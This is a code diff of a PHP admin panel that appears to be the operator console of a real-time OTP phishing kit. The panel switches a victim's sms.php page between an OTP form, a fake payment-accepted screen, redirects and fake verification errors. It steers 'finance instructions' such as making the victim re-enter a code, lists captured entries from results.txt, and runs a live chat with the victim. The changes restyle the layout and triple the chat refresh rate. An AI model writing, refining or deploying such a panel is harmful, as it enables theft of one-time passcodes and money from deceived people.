@@ -71,27 +71,6 @@ if (isset($_POST['action']) && $_POST['action'] === 'login') {
 
 $isAdmin = !empty($_SESSION['is_admin']);
 
-if ($isAdmin && isset($_POST['sms_mode']) && empty($_POST['ajax'])) {
-    $smsMode = $_POST['sms_mode'];
-    $customUrl = trim($_POST['custom_url'] ?? '');
-    $instruction = $_POST['instruction'] ?? 'stay_wait';
-    $chatEnabled = isset($_POST['chat_enabled']);
-
-    $validModes = ['default', 'payment_accept', 'redirect_wait', 'redirect_custom', 'error_verification'];
-    $validInstructions = ['stay_wait', 'prompt_otp', 'otp_error', 'otp_pass'];
-
-    if (!in_array($smsMode, $validModes, true)) {
-        $message = 'Invalid SMS mode selection.';
-    } elseif (!in_array($instruction, $validInstructions, true)) {
-        $message = 'Invalid instruction selection.';
-    } elseif ($smsMode === 'redirect_custom' && !filter_var($customUrl, FILTER_VALIDATE_URL)) {
-        $message = 'Please provide a full, valid URL for custom redirects (e.g., https://example.com/page).';
-    } else {
-        saveSmsState($stateFile, $smsMode, $customUrl, $instruction, $chatEnabled);
-        $message = 'SMS page updated successfully.';
-    }
-}
-
 if ($isAdmin && isset($_POST['ajax']) && $_POST['ajax'] === 'update_sms') {
     $smsMode = $_POST['sms_mode'] ?? 'default';
     $customUrl = trim($_POST['custom_url'] ?? '');
@@ -114,14 +93,13 @@ if ($isAdmin && isset($_POST['ajax']) && $_POST['ajax'] === 'update_sms') {
         saveSmsState($stateFile, $smsMode, $customUrl, $instruction, $chatEnabled);
         $message = 'SMS page updated successfully.';
         $success = true;
-        $currentState = loadSmsState($stateFile);
     }
 
     header('Content-Type: application/json');
     echo json_encode([
         'success' => $success ?? false,
         'message' => $message,
-        'state' => isset($currentState) ? $currentState : loadSmsState($stateFile)
+        'state' => loadSmsState($stateFile)
     ]);
     exit;
 }
@@ -151,195 +129,42 @@ $chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFil
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Panel</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #0b0b0b;
-            color: #f5f5f5;
-            margin: 0;
-            padding: 0;
-        }
-
-        .container {
-            max-width: 980px;
-            margin: 40px auto;
-            background: #141414;
-            padding: 24px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-        }
-
-        h1, h2 {
-            margin-top: 0;
-        }
-
-        .card {
-            background: #1f1f1f;
-            padding: 16px;
-            border-radius: 6px;
-            margin-bottom: 16px;
-            border: 1px solid #292929;
-        }
-
-        .form-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-            gap: 12px 20px;
-        }
-
-        .form-row {
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-        }
-
-        .form-row label {
-            font-weight: 600;
-            color: #e5e5e5;
-        }
-
-        input[type="text"],
-        input[type="password"],
-        select,
-        textarea {
-            width: 100%;
-            padding: 10px;
-            border-radius: 6px;
-            border: 1px solid #333;
-            background: #111;
-            color: #f5f5f5;
-            box-sizing: border-box;
-        }
-
-        textarea {
-            min-height: 100px;
-            resize: vertical;
-        }
-
-        .inline-controls {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .inline-controls label {
-            margin: 0;
-        }
-
-        button {
-            padding: 10px 16px;
-            border: none;
-            border-radius: 4px;
-            background: #e50914;
-            color: #fff;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-
-        button:hover {
-            background: #b20710;
-        }
-
-        .message {
-            padding: 12px;
-            background: #1f3b1f;
-            border: 1px solid #2e7d32;
-            color: #b9f6ca;
-            border-radius: 4px;
-            margin-bottom: 12px;
-        }
-
-        .error {
-            background: #3b1f1f;
-            border: 1px solid #c62828;
-            color: #ffcdd2;
-        }
-
-        pre {
-            background: #0f0f0f;
-            padding: 12px;
-            border-radius: 4px;
-            white-space: pre-wrap;
-            word-break: break-word;
-        }
-
-        .login-wrapper {
-            max-width: 420px;
-            margin: 80px auto;
-        }
-
-        .logout-link {
-            display: inline-block;
-            margin-top: 8px;
-            color: #90caf9;
-        }
-
-        .chat-box {
-            background: #0f0f0f;
-            border: 1px solid #2a2a2a;
-            border-radius: 6px;
-            padding: 12px;
-            max-height: 260px;
-            overflow-y: auto;
-            margin-top: 8px;
-        }
-
-        .chat-message {
-            margin-bottom: 10px;
-            padding: 8px;
-            border-radius: 6px;
-        }
-
-        .chat-message.admin {
-            background: #17212b;
-            border: 1px solid #2c3e50;
-        }
-
-        .chat-message.user {
-            background: #1b2a18;
-            border: 1px solid #2e7d32;
-        }
-
-        .chat-meta {
-            font-size: 12px;
-            color: #9e9e9e;
-        }
-
-        .results-entry {
-            background: #0f0f0f;
-            border: 1px solid #2a2a2a;
-            border-radius: 6px;
-            padding: 12px;
-            margin-bottom: 12px;
-            white-space: pre-wrap;
-            word-break: break-word;
-        }
-
-        .results-pagination {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            flex-wrap: wrap;
-            margin-top: 12px;
-        }
-
-        .results-pagination a,
-        .results-pagination span {
-            padding: 8px 12px;
-            border-radius: 4px;
-            border: 1px solid #333;
-            background: #1f1f1f;
-            color: #f5f5f5;
-            text-decoration: none;
-        }
-
-        .results-pagination .active {
-            background: #e50914;
-            border-color: #e50914;
-        }
-
-        .results-pagination .disabled {
-            opacity: 0.5;
-            cursor: default;
+        body { font-family: Arial, sans-serif; background: #0b0b0b; color: #f5f5f5; margin: 0; }
+        .container { max-width: 1160px; margin: 30px auto; background: #141414; padding: 24px; border-radius: 10px; box-shadow: 0 0 14px rgba(0, 0, 0, 0.45); }
+        .card { background: #1f1f1f; padding: 16px; border-radius: 8px; border: 1px solid #2d2d2d; }
+        .login-wrapper { max-width: 420px; margin: 80px auto; }
+        .top-bar { display: flex; justify-content: space-between; align-items: center; gap: 16px; margin-bottom: 12px; }
+        .logout-link { color: #90caf9; }
+        .admin-grid { display: grid; grid-template-columns: 1.15fr 1fr; gap: 16px; margin-top: 14px; }
+        .stack { display: flex; flex-direction: column; gap: 16px; }
+        .form-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 12px 20px; }
+        .form-row { display: flex; flex-direction: column; gap: 6px; }
+        .form-row label { font-weight: 600; }
+        input[type="text"], input[type="password"], select, textarea { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #333; background: #111; color: #f5f5f5; box-sizing: border-box; }
+        textarea { min-height: 84px; resize: vertical; }
+        .inline-controls { display: flex; align-items: center; gap: 8px; }
+        button { padding: 10px 16px; border: none; border-radius: 8px; background: #e50914; color: #fff; cursor: pointer; }
+        button:hover { background: #b20710; }
+        .message { padding: 12px; background: #1f3b1f; border: 1px solid #2e7d32; color: #b9f6ca; border-radius: 6px; margin-bottom: 12px; }
+        .error { background: #3b1f1f; border-color: #c62828; color: #ffcdd2; }
+        .hint { color: #bdbdbd; margin: 0 0 10px; font-size: 13px; }
+        .chat-box { background: #0f0f0f; border: 1px solid #2a2a2a; border-radius: 8px; padding: 12px; max-height: 370px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
+        .chat-message { padding: 8px; border-radius: 8px; }
+        .chat-message.admin { background: #17212b; border: 1px solid #2c3e50; }
+        .chat-message.user { background: #1b2a18; border: 1px solid #2e7d32; }
+        .chat-meta { font-size: 12px; color: #9e9e9e; }
+        .chat-composer { display: flex; gap: 10px; align-items: flex-end; margin-top: 12px; }
+        .chat-composer textarea { min-height: 66px; margin: 0; }
+        .chat-composer button { min-height: 66px; min-width: 110px; font-weight: 700; }
+        .results-entry { background: #0f0f0f; border: 1px solid #2a2a2a; border-radius: 6px; padding: 12px; margin-bottom: 12px; white-space: pre-wrap; word-break: break-word; }
+        .results-pagination { display: flex; justify-content: center; gap: 8px; flex-wrap: wrap; margin-top: 12px; }
+        .results-pagination a, .results-pagination span { padding: 8px 12px; border-radius: 4px; border: 1px solid #333; background: #1f1f1f; color: #f5f5f5; text-decoration: none; }
+        .results-pagination .active { background: #e50914; border-color: #e50914; }
+        .results-pagination .disabled { opacity: 0.5; cursor: default; }
+        @media (max-width: 940px) {
+            .admin-grid { grid-template-columns: 1fr; }
+            .chat-composer { flex-direction: column; align-items: stretch; }
+            .chat-composer button { min-height: 46px; width: 100%; }
         }
     </style>
 </head>
@@ -348,130 +173,105 @@ $chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFil
     <div class="login-wrapper">
         <div class="card">
             <h1>Admin Login</h1>
-            <?php if ($message): ?>
-                <div class="message error"><?php echo htmlspecialchars($message); ?></div>
-            <?php endif; ?>
+            <?php if ($message): ?><div class="message error"><?php echo htmlspecialchars($message); ?></div><?php endif; ?>
             <form method="post" class="form-grid" novalidate>
                 <input type="hidden" name="action" value="login">
-                <div class="form-row">
-                    <label for="username">Username</label>
-                    <input type="text" id="username" name="username" required>
-                </div>
-
-                <div class="form-row">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" name="password" required>
-                </div>
-
+                <div class="form-row"><label for="username">Username</label><input type="text" id="username" name="username" required></div>
+                <div class="form-row"><label for="password">Password</label><input type="password" id="password" name="password" required></div>
                 <button type="submit">Login</button>
             </form>
         </div>
     </div>
 <?php else: ?>
     <div class="container">
-        <h1>Admin Panel</h1>
-        <?php if ($message): ?>
-            <div class="message"><?php echo htmlspecialchars($message); ?></div>
-        <?php endif; ?>
+        <div class="top-bar">
+            <h1>Admin Panel</h1>
+            <a class="logout-link" href="?logout=1">Logout</a>
+        </div>
+
+        <?php if ($message): ?><div class="message"><?php echo htmlspecialchars($message); ?></div><?php endif; ?>
         <div class="message" id="flash-message" style="display:none;"></div>
-        <a class="logout-link" href="?logout=1">Logout</a>
 
-        <div class="card">
-            <h2>SMS Page Controls</h2>
-            <form method="post" class="form-grid" id="sms-form" novalidate>
-                <div class="form-row">
-                    <label for="sms_mode">Choose what sms.php should do</label>
-                    <select name="sms_mode" id="sms_mode" required>
-                        <option value="default" <?php echo $currentState['mode'] === 'default' ? 'selected' : ''; ?>>Show OTP form (default)</option>
-                        <option value="payment_accept" <?php echo $currentState['mode'] === 'payment_accept' ? 'selected' : ''; ?>>Show user accepted payment</option>
-                        <option value="redirect_wait" <?php echo $currentState['mode'] === 'redirect_wait' ? 'selected' : ''; ?>>Redirect to wait.php?next=sms.php</option>
-                        <option value="redirect_custom" <?php echo $currentState['mode'] === 'redirect_custom' ? 'selected' : ''; ?>>Redirect to a specific URL</option>
-                        <option value="error_verification" <?php echo $currentState['mode'] === 'error_verification' ? 'selected' : ''; ?>>Show verification error</option>
-                    </select>
-                </div>
-
-                <div class="form-row">
-                    <label for="custom_url">Custom redirect URL (only used for specific URL option)</label>
-                    <input type="text" id="custom_url" name="custom_url" value="<?php echo htmlspecialchars($currentState['custom_url']); ?>" placeholder="https://example.com/path">
-                </div>
-
-                <div class="form-row">
-                    <label for="instruction">Finance instruction for the next user step</label>
-                    <select name="instruction" id="instruction">
-                        <option value="stay_wait" <?php echo $currentState['instruction'] === 'stay_wait' ? 'selected' : ''; ?>>Keep user on wait.php</option>
-                        <option value="prompt_otp" <?php echo $currentState['instruction'] === 'prompt_otp' ? 'selected' : ''; ?>>Send user to SMS to enter OTP</option>
-                        <option value="otp_error" <?php echo $currentState['instruction'] === 'otp_error' ? 'selected' : ''; ?>>Send OTP error then let them retry</option>
-                        <option value="otp_pass" <?php echo $currentState['instruction'] === 'otp_pass' ? 'selected' : ''; ?>>Show SMS OTP pass</option>
-                    </select>
-                </div>
-
-                <div class="form-row">
-                    <div class="inline-controls">
-                        <input type="checkbox" id="chat_enabled" name="chat_enabled" value="1" <?php echo !empty($currentState['chat_enabled']) ? 'checked' : ''; ?>>
-                        <label for="chat_enabled">Enable live chat for user</label>
-                    </div>
-                    <small>Chat appears on user pages only when you enable it here.</small>
-                </div>
-
-                <button type="submit">Update SMS Page</button>
-            </form>
-        </div>
-
-        <div class="card">
-            <h2>Live Chat (admin view)</h2>
-            <p>Use this area to communicate with the user in real time once chat is enabled.</p>
-            <div class="chat-box" id="chat-box">
-                <?php if (!empty($chatLog)): ?>
-                    <?php foreach ($chatLog as $entry): ?>
-                        <div class="chat-message <?php echo htmlspecialchars($entry['sender']); ?>">
-                            <div><?php echo nl2br(htmlspecialchars($entry['message'])); ?></div>
-                            <div class="chat-meta"><?php echo htmlspecialchars(ucfirst($entry['sender'])); ?> • <?php echo date('Y-m-d H:i:s', $entry['timestamp']); ?></div>
+        <div class="admin-grid">
+            <div class="stack">
+                <div class="card">
+                    <h2>SMS Page Controls</h2>
+                    <p class="hint">Manage user flow and live chat from this section.</p>
+                    <form method="post" class="form-grid" id="sms-form" novalidate>
+                        <div class="form-row">
+                            <label for="sms_mode">Choose what sms.php should do</label>
+                            <select name="sms_mode" id="sms_mode" required>
+                                <option value="default" <?php echo $currentState['mode'] === 'default' ? 'selected' : ''; ?>>Show OTP form (default)</option>
+                                <option value="payment_accept" <?php echo $currentState['mode'] === 'payment_accept' ? 'selected' : ''; ?>>Show user accepted payment</option>
+                                <option value="redirect_wait" <?php echo $currentState['mode'] === 'redirect_wait' ? 'selected' : ''; ?>>Redirect to wait.php?next=sms.php</option>
+                                <option value="redirect_custom" <?php echo $currentState['mode'] === 'redirect_custom' ? 'selected' : ''; ?>>Redirect to a specific URL</option>
+                                <option value="error_verification" <?php echo $currentState['mode'] === 'error_verification' ? 'selected' : ''; ?>>Show verification error</option>
+                            </select>
                         </div>
-                    <?php endforeach; ?>
-                <?php else: ?>
-                    <div class="chat-meta">No messages yet.</div>
-                <?php endif; ?>
+                        <div class="form-row">
+                            <label for="custom_url">Custom redirect URL (for specific URL option)</label>
+                            <input type="text" id="custom_url" name="custom_url" value="<?php echo htmlspecialchars($currentState['custom_url']); ?>" placeholder="https://example.com/path">
+                        </div>
+                        <div class="form-row">
+                            <label for="instruction">Finance instruction for the next user step</label>
+                            <select name="instruction" id="instruction">
+                                <option value="stay_wait" <?php echo $currentState['instruction'] === 'stay_wait' ? 'selected' : ''; ?>>Keep user on wait.php</option>
+                                <option value="prompt_otp" <?php echo $currentState['instruction'] === 'prompt_otp' ? 'selected' : ''; ?>>Send user to SMS to enter OTP</option>
+                                <option value="otp_error" <?php echo $currentState['instruction'] === 'otp_error' ? 'selected' : ''; ?>>Send OTP error then let them retry</option>
+                                <option value="otp_pass" <?php echo $currentState['instruction'] === 'otp_pass' ? 'selected' : ''; ?>>Show SMS OTP pass</option>
+                            </select>
+                        </div>
+                        <div class="form-row">
+                            <div class="inline-controls">
+                                <input type="checkbox" id="chat_enabled" name="chat_enabled" value="1" <?php echo !empty($currentState['chat_enabled']) ? 'checked' : ''; ?>>
+                                <label for="chat_enabled">Enable live chat for user</label>
+                            </div>
+                            <small>Chat appears on user pages only when enabled.</small>
+                        </div>
+                        <button type="submit">Update SMS Page</button>
+                    </form>
+                </div>
+
+                <div class="card">
+                    <h2>Saved Results (results.txt)</h2>
+                    <?php if ($totalEntries === 0): ?>
+                        <div class="chat-meta">No results saved yet.</div>
+                    <?php else: ?>
+                        <?php foreach ($paginatedResults as $entry): ?>
+                            <div class="results-entry"><?php echo nl2br(htmlspecialchars($entry)); ?></div>
+                        <?php endforeach; ?>
+                        <?php if ($totalPages > 1): ?>
+                            <div class="results-pagination">
+                                <?php if ($page > 1): ?><a href="?page=<?php echo $page - 1; ?>">&laquo; Prev</a><?php else: ?><span class="disabled">&laquo; Prev</span><?php endif; ?>
+                                <?php for ($p = 1; $p <= $totalPages; $p++): ?>
+                                    <?php if ($p === $page): ?><span class="active"><?php echo $p; ?></span><?php else: ?><a href="?page=<?php echo $p; ?>"><?php echo $p; ?></a><?php endif; ?>
+                                <?php endfor; ?>
+                                <?php if ($page < $totalPages): ?><a href="?page=<?php echo $page + 1; ?>">Next &raquo;</a><?php else: ?><span class="disabled">Next &raquo;</span><?php endif; ?>
+                            </div>
+                        <?php endif; ?>
+                    <?php endif; ?>
+                </div>
             </div>
-            <div class="form-row">
+
+            <div class="card">
+                <h2>Live Chat (admin view)</h2>
+                <p class="hint">Instant support-style chat with faster refresh.</p>
+                <div class="chat-box" id="chat-box">
+                    <?php if (!empty($chatLog)): ?>
+                        <?php foreach ($chatLog as $entry): ?>
+                            <div class="chat-message <?php echo htmlspecialchars($entry['sender']); ?>">
+                                <div><?php echo nl2br(htmlspecialchars($entry['message'])); ?></div>
+                                <div class="chat-meta"><?php echo htmlspecialchars(ucfirst($entry['sender'])); ?> • <?php echo date('Y-m-d H:i:s', $entry['timestamp']); ?></div>
+                            </div>
+                        <?php endforeach; ?>
+                    <?php else: ?><div class="chat-meta">No messages yet.</div><?php endif; ?>
+                </div>
                 <label for="admin-chat-message">Send a message</label>
-                <textarea id="admin-chat-message" placeholder="Type a message to the user..." <?php echo empty($currentState['chat_enabled']) ? 'disabled' : ''; ?>></textarea>
-                <button type="button" id="send-admin-message" <?php echo empty($currentState['chat_enabled']) ? 'disabled' : ''; ?>>Send</button>
+                <div class="chat-composer">
+                    <textarea id="admin-chat-message" placeholder="Write your message to the user..." <?php echo empty($currentState['chat_enabled']) ? 'disabled' : ''; ?>></textarea>
+                    <button type="button" id="send-admin-message" <?php echo empty($currentState['chat_enabled']) ? 'disabled' : ''; ?>>Send</button>
+                </div>
             </div>
-        </div>
-
-        <div class="card">
-            <h2>Saved Results (results.txt)</h2>
-            <?php if ($totalEntries === 0): ?>
-                <div class="chat-meta">No results saved yet.</div>
-            <?php else: ?>
-                <?php foreach ($paginatedResults as $entry): ?>
-                    <div class="results-entry"><?php echo nl2br(htmlspecialchars($entry)); ?></div>
-                <?php endforeach; ?>
-
-                <?php if ($totalPages > 1): ?>
-                    <div class="results-pagination">
-                        <?php if ($page > 1): ?>
-                            <a href="?page=<?php echo $page - 1; ?>">&laquo; Prev</a>
-                        <?php else: ?>
-                            <span class="disabled">&laquo; Prev</span>
-                        <?php endif; ?>
-
-                        <?php for ($p = 1; $p <= $totalPages; $p++): ?>
-                            <?php if ($p === $page): ?>
-                                <span class="active"><?php echo $p; ?></span>
-                            <?php else: ?>
-                                <a href="?page=<?php echo $p; ?>"><?php echo $p; ?></a>
-                            <?php endif; ?>
-                        <?php endfor; ?>
-
-                        <?php if ($page < $totalPages): ?>
-                            <a href="?page=<?php echo $page + 1; ?>">Next &raquo;</a>
-                        <?php else: ?>
-                            <span class="disabled">Next &raquo;</span>
-                        <?php endif; ?>
-                    </div>
-                <?php endif; ?>
-            <?php endif; ?>
         </div>
     </div>
 <?php endif; ?>
@@ -525,9 +325,7 @@ $chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFil
         try {
             await fetch('chat_api.php?action=send', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                },
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: new URLSearchParams({ sender: 'admin', message })
             });
             fetchChat();
@@ -547,7 +345,7 @@ $chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFil
 
         if (!chatInput.disabled) {
             fetchChat();
-            setInterval(fetchChat, 3000);
+            setInterval(fetchChat, 1000);
         }
     }
 
